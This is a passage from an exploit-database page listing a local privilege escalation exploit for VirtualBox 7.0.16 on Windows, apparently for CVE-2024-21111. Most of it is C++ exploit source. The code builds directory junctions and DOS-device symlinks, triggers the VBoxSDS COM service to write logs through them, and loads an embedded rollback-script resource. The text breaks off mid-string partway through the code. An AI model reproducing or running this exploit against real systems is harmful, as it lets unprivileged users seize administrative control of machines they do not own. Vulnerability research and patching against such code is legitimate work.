---
title: VirtualBox 7.0.16 Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2025050028
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-11
fetch_date: 2025-10-06T22:24:29.181320
---

# VirtualBox 7.0.16 Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **VirtualBox 7.0.16 Privilege Escalation** **2025.05.10**  Credit:  **[Milad Karimi](https://cxsecurity.com/author/Milad%2BKarimi/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: VirtualBox 7.0.16 - Local Privilege Escalation
# Date: 2025-05-06
# Exploit Author: Milad Karimi (Ex3ptionaL)
# Contact: miladgrayhat@gmail.com
# Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL
# Tested on: Win x64
# CVE : CVE-2024-21111
#include <Windows.h>
#include <Shlwapi.h>
#include <WtsApi32.h>
#include <Msi.h>
#include <PathCch.h>
#include <AclAPI.h>
#include <iostream>
#include "resource.h"
#include "def.h"
#include "FileOplock.h"
#pragma comment(lib, "Msi.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "wtsapi32")
#pragma comment(lib, "PathCch.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma warning(disable:4996)
struct \_\_declspec(uuid("74AB5FFE-8726-4435-AA7E-876D705BCBA5"))
CLSID\_VBoxSDS;
FileOpLock\* oplock;
HANDLE hFile, vb11, h;
HANDLE hthread;
NTSTATUS retcode;
HMODULE hm = GetModuleHandle(NULL);
HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR\_RBS1), L"rbs");
DWORD RbsSize = SizeofResource(hm, res);
void\* RbsBuff = LoadResource(hm, res);
WCHAR dir[MAX\_PATH] = { 0x0 };
wchar\_t filen[MAX\_PATH] = { 0x0 };
DWORD WINAPI install(void\*);
BOOL Move(HANDLE hFile);
void callback();
HANDLE getDirectoryHandle(LPWSTR file, DWORD access, DWORD share, DWORD
dispostion);
LPWSTR BuildPath(LPCWSTR path);
void loadapis();
VOID cb1();
VOID cb0();
BOOL Monitor(HANDLE hDir);
BOOL clearDataDir();
BOOL CreateJunction(LPCWSTR dir, LPCWSTR target) {
HANDLE hJunction;
DWORD cb;
wchar\_t printname[] = L"";
HANDLE hDir;
hDir = CreateFile(dir, FILE\_WRITE\_ATTRIBUTES, FILE\_SHARE\_READ, NULL,
OPEN\_EXISTING, FILE\_FLAG\_BACKUP\_SEMANTICS, NULL);
if (hDir == INVALID\_HANDLE\_VALUE) {
printf("[!] Failed to obtain handle on directory %ls.\n", dir);
return FALSE;
}
SIZE\_T TargetLen = wcslen(target) \* sizeof(WCHAR);
SIZE\_T PrintnameLen = wcslen(printname) \* sizeof(WCHAR);
SIZE\_T PathLen = TargetLen + PrintnameLen + 12;
SIZE\_T Totalsize = PathLen + (DWORD)(FIELD\_OFFSET(REPARSE\_DATA\_BUFFER,
GenericReparseBuffer.DataBuffer));
PREPARSE\_DATA\_BUFFER Data = (PREPARSE\_DATA\_BUFFER)malloc(Totalsize);
Data->ReparseTag = IO\_REPARSE\_TAG\_MOUNT\_POINT;
Data->ReparseDataLength = PathLen;
Data->Reserved = 0;
Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1,
printname, PrintnameLen + 2);
if (DeviceIoControl(hDir, FSCTL\_SET\_REPARSE\_POINT, Data, Totalsize, NULL,
0, &cb, NULL) != 0)
{
printf("[+] Junction %ls -> %ls created!\n", dir, target);
free(Data);
return TRUE;
}
else
{
printf("[!] Error: %d. Exiting\n", GetLastError());
free(Data);
return FALSE;
}
}
BOOL DeleteJunction(LPCWSTR path) {
REPARSE\_GUID\_DATA\_BUFFER buffer = { 0 };
BOOL ret;
buffer.ReparseTag = IO\_REPARSE\_TAG\_MOUNT\_POINT;
DWORD cb = 0;
IO\_STATUS\_BLOCK io;
HANDLE hDir;
hDir = CreateFile(path, FILE\_WRITE\_ATTRIBUTES, FILE\_SHARE\_READ, NULL,
OPEN\_EXISTING, FILE\_FLAG\_BACKUP\_SEMANTICS | FILE\_OPEN\_REPARSE\_POINT, NULL);
if (hDir == INVALID\_HANDLE\_VALUE) {
printf("[!] Failed to obtain handle on directory %ls.\n", path);
printf("%d\n", GetLastError());
return FALSE;
}
ret = DeviceIoControl(hDir, FSCTL\_DELETE\_REPARSE\_POINT, &buffer,
REPARSE\_GUID\_DATA\_BUFFER\_HEADER\_SIZE, NULL, NULL, &cb, NULL);
if (ret == 0) {
printf("Error: %d\n", GetLastError());
return FALSE;
}
else
{
printf("[+] Junction %ls delete!\n", dir);
return TRUE;
}
}
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
if (DefineDosDevice(DDD\_NO\_BROADCAST\_SYSTEM | DDD\_RAW\_TARGET\_PATH, object,
target)) {
printf("[+] Symlink %ls -> %ls created!\n", object, target);
return TRUE;
}
else
{
printf("error :%d\n", GetLastError());
return FALSE;
}
}
BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
if (DefineDosDevice(DDD\_NO\_BROADCAST\_SYSTEM | DDD\_RAW\_TARGET\_PATH |
DDD\_REMOVE\_DEFINITION | DDD\_EXACT\_MATCH\_ON\_REMOVE, object, target)) {
printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
return TRUE;
}
else
{
printf("error :%d\n", GetLastError());
return FALSE;
}
}
void runSDS(int delay) {
if (delay == 1) {
printf("[!] sleeping for 2 sec\n");
Sleep(2000);
}
CoInitialize(NULL);
LPVOID ppv;
// 1st trigger to create VBoxSDS.log dir
CoCreateInstance(\_\_uuidof(CLSID\_VBoxSDS), 0, CLSCTX\_LOCAL\_SERVER,
IID\_IUnknown, &ppv);
CoUninitialize();
}
BOOL checkSDSLog() {
BOOL clear = FALSE;
std::wstring vboxDataDir = L"C:\\ProgramData\\VirtualBox\\VBoxSDS.log.\*";
HANDLE hFind;
WIN32\_FIND\_DATA data;
hFind = FindFirstFile(LPCWSTR(vboxDataDir.c\_str()), &data);
// iterate first VBoxSDS.log
FindNextFile(hFind, &data);
if (hFind != INVALID\_HANDLE\_VALUE) {
do {
if (wcswcs(data.cFileName, L"VBoxSDS.log.")) {
runSDS(0);
//wprintf(L"%s\n", data.cFileName);
}
else {
printf("[+] Logs have been cleared!\n");
clear = TRUE;
}
//wprintf(L"%s\n", data.cFileName);
} while (FindNextFile(hFind, &data));
FindClose(hFind);
}
//printf("CLEAR: %d\n", clear);
return clear;
}
BOOL enumProc(const wchar\_t\* procName) {
PWTS\_PROCESS\_INFO processes{};
BOOL ok = FALSE;
DWORD count;
if (WTSEnumerateProcesses(WTS\_CURRENT\_SERVER\_HANDLE, NULL, 1, &processes,
&count)) {
for (DWORD i = 0; i < count; i++) {
if (wcswcs(processes[i].pProcessName, procName)) {
wprintf(L"[!] Process active: %s with PID %d\n",
processes[i].pProcessName, processes[i].ProcessId);
ok = TRUE;
break;
}
}
}
else {
printf("err: %d\n", GetLastError());
}
WTSFreeMemory(processes);
return ok;
}
void checkIfExists() {
if (enumProc(L"VirtualBoxVM.exe")) {
printf("[!] You seem to have active VMs running, please stop them before
running this to prevent corruption of any saved data of the VMs...